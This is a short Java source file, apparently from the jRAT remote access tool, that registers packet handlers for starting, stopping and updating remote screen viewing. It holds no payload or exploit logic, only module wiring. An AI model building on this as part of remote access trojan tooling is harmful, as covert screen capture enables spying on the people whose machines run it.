package jrat.module.screen;

import jrat.api.ClientModule;
import jrat.client.packets.incoming.IncomingPackets;

public class ScreenClientModule extends ClientModule {

    public void init() throws Exception {
        IncomingPackets.register((short) 12, Packet12RemoteScreen.class);
        IncomingPackets.register((short) 26, Packet26StopRemoteScreen.class);
        IncomingPackets.register((short) 50, Packet50UpdateRemoteScreen.class);
    }
}
